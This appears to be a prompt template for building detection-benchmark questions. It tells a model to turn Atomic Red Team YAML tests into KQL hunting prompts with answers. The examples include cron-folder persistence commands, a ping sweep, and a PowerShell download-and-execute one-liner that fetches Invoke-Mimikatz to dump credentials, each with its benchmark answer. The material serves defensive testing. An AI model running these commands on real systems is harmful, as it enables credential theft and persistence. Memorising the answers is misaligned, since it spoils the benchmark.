Convert atomic red team YAML descriptions into analytical prompts that guide an AI analyst in a benchmark environment to discern the correct KQL (Kusto Query Language) query needed to get to the answer
These prompts should provide some context and direction, but should remain intentionally vague to encourage the analyst to engage in problem-solving to arrive at the correct query.

# Steps
1. **Analyze the YAML Description**: Understand the key behavior being described in the YAML.
2. **Formulate the Prompt**: Create a narrative that frames the behavior in a real-world scenario without giving away the exact query or all necessary details. Add to the question what the AI analyst should find out.
3. **Incorporate Ambiguity**: Ensure the prompt contains enough ambiguity to engage the analyst's critical thinking and query formulation skills.
4. **Avoid Specific Queries**: Do not include the exact query in the prompt, but rather focus on key elements or indicators that need to be queried.
5. Define the answer which the AI analyst should find out. Formulate it in a question style. For example: what was the filename?

# Output Format
- Provide an analytical prompt as a short paragraph.
- The prompt should hint at the expected behavior without detailing it explicitly.
- It should lead to a KQL query but not explicitly state it.

# Examples
**Example 1:**

- **YAML**: "    
- name: Cron - Add script to all cron subfolders
    auto_generated_guid: b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0
    description: |
        This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
    supported_platforms:
    - macos
    - linux
    input_arguments:
        command:
        description: Command to execute
        type: string
        default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
        cron_script_name:
        description: Name of file to store in cron folder
        type: string
        default: persistevil
    executor:
        elevation_required: true
        name: bash
        command: |
        echo "#{command}" > /etc/cron.daily/#{cron_script_name}
        echo "#{command}" > /etc/cron.hourly/#{cron_script_name}
        echo "#{command}" > /etc/cron.monthly/#{cron_script_name}
        echo "#{command}" > /etc/cron.weekly/#{cron_script_name}
        cleanup_command: |
        rm /etc/cron.daily/#{cron_script_name} -f
        rm /etc/cron.hourly/#{cron_script_name} -f
        rm /etc/cron.monthly/#{cron_script_name} -f
        rm /etc/cron.weekly/#{cron_script_name} -f"
- **Prompt**: Identify any suspicious configuration changes on linux that could indicate an attacker has scheduled malicious commands to run automatically. Find out what command has been added.
- **Answer**: echo 'Hello from Atomic Red Team' > /tmp/atomic.log

**Example 2:**
- **YAML**: "    
- name: Remote System Discovery - sweep
  auto_generated_guid: 96db2632-8417-4dbb-b8bb-a8b92ba391de
  description: |
    Identify remote systems via ping sweep.

    Upon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.
  supported_platforms:
  - linux
  - macos
  input_arguments:
    start_host:
      description: Subnet used for ping sweep.
      type: string
      default: "1"
    stop_host:
      description: Subnet used for ping sweep.
      type: string
      default: "254"
    subnet:
      description: Subnet used for ping sweep.
      type: string
      default: 192.168.1
  executor:
    command: |
      for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo "#{subnet}.$ip UP" || : ; done
    name: sh
- **Prompt**: Find out which subnet was ping sweeped
- **Answer**: 192.168.1.1/24


**Example 2:**
- **YAML**: "    
- name: Powershell Mimikatz
  auto_generated_guid: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
  description: |
    Dumps credentials from memory via Powershell by invoking a remote mimikatz script.
    If Mimikatz runs successfully you will see several usernames and hashes output to the screen.
    Common failures include seeing an \"access denied\" error which results when Anti-Virus blocks execution. 
    Or, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen "ERROR kuhl_m_sekurlsa_acquireLSA"
  supported_platforms:
  - windows
  input_arguments:
    remote_script:
      description: URL to a remote Mimikatz script that dumps credentials
      type: url
      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
  executor:
    command: |
      IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
    name: powershell
    elevation_required: true
- **Prompt**: Credentials were dumped on a windows device. Find out where the script was downloaded from.
- **Answer**: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1

# Notes

- Ensure that each prompt stimulates analytical thinking and encourages exploration of various KQL query paths.
- It may be necessary to adjust the level of detail based on the analyst's familiarity with different query constructs.
- Consider including additional context or background information if it is essential for understanding the potential behavior.
- Dont give tips in the prompt.
- Be concise
- Always mention the operating system
- Also create a base KQL Query on the atomic red team yaml to compare the results from the base query to the AI analyst's query
- Answer should be exact same words as the yaml. It should be only 1 word each. Make sure the answer needed are hard. It should not be possible to answer the question just based on knowledge. It should be needed to find the correct logs to answer the question
    - Answer can be:
        - Tools (whats the name of the tool used?)
        - Files (what was the name of the output file? Dont use paths just file names)
        - Commands (what was the full command used)
